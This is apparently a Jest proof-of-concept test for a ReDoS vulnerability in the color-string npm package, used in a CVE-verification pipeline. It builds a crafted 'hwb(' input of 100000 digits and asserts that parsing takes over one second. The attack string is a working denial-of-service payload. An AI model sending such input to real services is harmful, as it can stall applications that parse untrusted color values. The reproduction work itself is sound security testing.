// Self-contained ReDoS PoC for adopt-loop / cve pipelines: no require("../utils"),
// so it works after the test file is relocated into the package checkout. jest's
// moduleNameMapper makes require("color-string") resolve to the checkout's source.
//
// Input bumped 50000 -> 100000: the vulnerable hwb() parse is ~quadratic, and at
// 50000 it lands ~0.97s (under the 1s bar) on faster machines. 100000 clears 1s
// with comfortable margin (~4s) while finishing well under the runner timeout.
test("ReDoS in color-string", () => {
  const colorString = require("color-string");
  const measureTime = (f) => {
    const s = process.hrtime();
    f();
    return process.hrtime(s);
  };
  const attack_str = "hwb(" + "1".repeat(100000) + "!";
  const t = measureTime(() => {
    colorString.get(attack_str);
  });
  const time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
